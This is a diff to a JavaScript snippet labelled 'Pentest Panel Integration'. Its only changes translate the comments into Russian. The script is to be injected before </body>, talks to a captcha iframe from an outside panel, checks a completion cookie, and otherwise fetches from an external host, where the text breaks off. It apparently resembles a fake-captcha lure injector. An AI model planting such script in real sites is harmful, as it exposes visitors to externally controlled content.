@@ -1,5 +1,5 @@
-<!-- Pentest Panel Integration -->
-<!-- Add this code before </body> tag -->
+<!-- Интеграция пентест панели -->
+<!-- Добавьте этот код перед закрывающим тегом </body> -->
 
 <script type='text/javascript'>
 // Событие обмена сообщениями между iframe подгружаемого с панели и кодом страницы в которой размещена капча
@@ -11,7 +11,6 @@ window.addEventListener("message", e =>
     }
 });
 
-// Function for reading cookie
 // Функция чтения куки
 function getCookie(name)
 {
@@ -19,13 +18,11 @@ function getCookie(name)
 	return match ? decodeURIComponent(match[2]) : null;
 }
 
-// Reading cookie
 // Чтение куки
 const cookiename = "cookie-captcha-complete";
 const cookie = getCookie(cookiename);
 
-// Cookie found
-// Кука не найдена
+// Если кука не найдена
 if(!cookie)
 {
 	fetch("https://ipv6app.bar") 
